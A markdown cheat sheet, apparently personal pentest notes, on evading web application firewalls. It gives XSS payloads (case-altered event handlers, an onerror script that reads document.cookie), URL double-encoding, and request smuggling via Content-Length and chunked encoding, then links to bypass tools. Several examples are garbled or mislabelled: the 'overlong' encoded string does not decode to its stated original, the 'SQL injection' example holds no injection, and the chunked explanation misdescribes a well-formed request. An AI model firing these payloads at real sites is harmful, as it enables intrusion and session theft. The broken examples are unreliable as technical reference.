#### Testing

- **Overlong URL Encoding:-** Overlong URL encoding involves encoding characters multiple times to bypass URL decoding filters.

    **Payload Example:** XSS payload with overlong URL encoding
    ```
    Original: <script>alert(1)</script>
    Double encoded: %253C%252Fscr%2525%32Ft%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E

- **Double Encoding:-** Double encoding involves encoding special characters twice to bypass filters expecting single encoding.

    **Payload Example:-** SQL Injection with double URL encoding
    ```
    Original: .php?id=1
    Double encoded: .php%253fid%253d1
 
 > **Explanation:** Characters like . (%2e) and ? (%3f) are double URL encoded (%252e, %253f), which might bypass filters expecting single URL encoding.

### Request Smuggling 
- **Content-Length Discrepancy:-** Content-Length discrepancy exploits inconsistencies in Content-Length headers to confuse WAFs.

**Payload Example:** Exploiting Content-Length header discrepancy
```
POST /login HTTP/1.1
Host: example.com
Content-Length: 10

username=admin&password=pass
```
> **Explanation:** The Content-Length header claims 10 bytes, but the actual payload is longer (username=admin&password=pass), which might confuse WAFs relying on Content-Length for request validation.

- **Chunked Transfer Encoding:-** Chunked Transfer Encoding manipulates chunked encoding to evade WAF filters.

    **Payload Example:** Manipulating chunked encoding
    ```
    POST /upload HTTP/1.1
    Host: example.com
    Transfer-Encoding: chunked

    4
    data
    0
    ```
> **Explanation: T**he payload uses chunked encoding with an ambiguous boundary (0 after data), which might bypass filters expecting a specific chunked encoding structure.

#### Bypassing JavaScript Filters 
- **Event Handler Manipulation:-** Event handler manipulation bypasses filters blocking specific JavaScript event handlers.

**Payload Example:** Bypassing onmouseover filter
```
Original: <img src="x" onmouseover=alert(1)>
Modified: <img src="x" onmoUSeover=alert(1)>
```
> **Explanation:-** The onmouseover event handler is modified with mixed cases (onmoUSeover) to evade filters expecting exact event handler names.

- **DOM-based XSS:-** DOM-based XSS uses client-side techniques to bypass server-side WAF rules.

    **Payload Example:** Exploiting DOM-based XSS
    ```
    Original: <script>alert(document.cookie)</script>
    Modified: <img src="notexist" onerror="document.write('<script>alert(document.cookie)</scr'+'ipt>');">

> **Explanation:** The payload injects JavaScript through onerror attribute, using string concatenation (+'ipt>') to evade WAF filters expecting direct script tags.

Tools:- https://github.com/Ekultek/WhatWaf

Ref

https://github.com/0xInfection/Awesome-WAF

https://github.com/kh4sh3i/WAF-Bypass

https://www.yeswehack.com/learn-bug-bounty/web-application-firewall-bypass

https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2

https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/


